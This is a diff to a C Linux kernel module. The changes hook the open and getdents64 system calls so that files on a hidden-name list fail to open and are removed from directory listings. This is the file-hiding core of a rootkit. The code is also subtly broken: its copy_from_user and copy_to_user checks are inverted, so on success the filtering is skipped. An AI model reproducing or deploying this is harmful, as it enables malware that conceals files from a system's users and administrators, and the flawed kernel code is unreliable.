@@ -1,4 +1,5 @@
 #include "syscall_metadata.h"
+#include <linux/dirent.h>
 #include <linux/module.h>
 
 #define NUM_STRINGS 1
@@ -22,6 +23,18 @@ static bool ends_with(const char *str, const char *suffix) {
   return strcmp(str + (str_len - suffix_len), suffix) == 0;
 }
 
+bool is_hidden_file(const char *str);
+bool is_hidden_file(const char *str) {
+  for (int i = 0; i < NUM_STRINGS; i++) {
+    if (ends_with(str, hidden_filenames[i])) {
+      printk(KERN_INFO "tried accessing file: %s\n", hidden_filenames[i]);
+      return true;
+    }
+  }
+
+  return false;
+}
+
 #define PATH_BUFFER_SIZE 1024
 
 void open_enter_handler(char *__user filename,
@@ -34,9 +47,8 @@ void open_enter_handler(char *__user filename,
   int n = strncpy_from_user(buf, filename, PATH_BUFFER_SIZE);
   if (n) {
     for (int i = 0; i < NUM_STRINGS; i++) {
-      if (ends_with(buf, hidden_filenames[i])) {
+      if (is_hidden_file(buf)) {
         syscall_metadata->metadata.open_metadata.should_fail = true;
-        printk(KERN_INFO "tried accessing file: %s\n", hidden_filenames[i]);
       }
     }
   }
@@ -49,4 +61,54 @@ void open_exit_handler(struct pt_regs *syscall_regs,
   if (syscall_metadata.metadata.open_metadata.should_fail) {
     syscall_regs->ax = -2;
   }
+}
+
+void getdents64_exit_handler(struct pt_regs *syscall_regs,
+                             struct syscall_metadata syscall_metadata);
+void getdents64_exit_handler(struct pt_regs *syscall_regs,
+                             struct syscall_metadata syscall_metadata) {
+
+  int nread = *(int *)&syscall_regs->ax;
+
+  if (nread == -1) {
+    return;
+  }
+
+  if (nread == 0) {
+    return;
+  }
+
+  struct linux_dirent64 *__user dirents_user =
+      syscall_metadata.metadata.get_dents_metadata.entries;
+  unsigned int dirents_user_size =
+      syscall_metadata.metadata.get_dents_metadata.buf_size;
+
+  void *buf = kmalloc(dirents_user_size, GFP_KERNEL);
+  int n = copy_from_user(buf, dirents_user, dirents_user_size);
+
+  if (!n) {
+    goto free;
+  }
+
+  struct linux_dirent64 *d;
+  for (int bpos = 0; bpos < nread;) {
+    d = (struct linux_dirent64 *)(buf + bpos);
+
+    if (is_hidden_file(d->d_name)) {
+      int reclen = d->d_reclen;
+      int remaining_bytes = nread - (bpos + reclen);
+      memmove(d, (char *)d + reclen, remaining_bytes);
+      nread -= reclen;
+    } else {
+      bpos += d->d_reclen;
+    }
+  }
+
+  n = copy_to_user(dirents_user, buf, dirents_user_size);
+  if (!n) {
+    goto free;
+  }
+  syscall_regs->ax = nread;
+free:
+  kfree(buf);
 }
